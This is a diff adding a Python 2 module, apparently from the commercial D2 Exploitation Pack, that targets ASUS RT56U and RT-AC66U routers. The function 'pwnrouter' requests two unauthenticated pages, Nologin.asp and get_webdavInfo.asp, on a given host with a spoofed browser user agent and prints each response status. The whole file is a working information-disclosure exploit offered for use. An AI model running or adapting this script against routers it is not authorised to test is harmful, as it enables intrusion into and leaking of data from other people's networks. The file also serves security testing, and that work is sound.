@@ -1,0 +1,51 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+###
+# STD modules
+###
+import os, sys
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_asus_1'
+_vendor_ = 'asus'
+_model_  = ['RT56U', 'RT-AC66U']
+_vuln_   = 'Information Disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  asps = [
+    "Nologin.asp",
+    "get_webdavInfo.asp",
+  ]
+  for asp in asps:
+    url = 'http://%s/%s'%(host, asp)
+    try:
+      nfo = cStringIO.StringIO()
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, url)
+      c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+      c.perform()
+      status = c.getinfo(pycurl.HTTP_CODE)
+      c.close()
+    except Exception, e:
+      print '[-] error : %s' % e
+      continue
+    print '[%d] %s'%(status, url)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
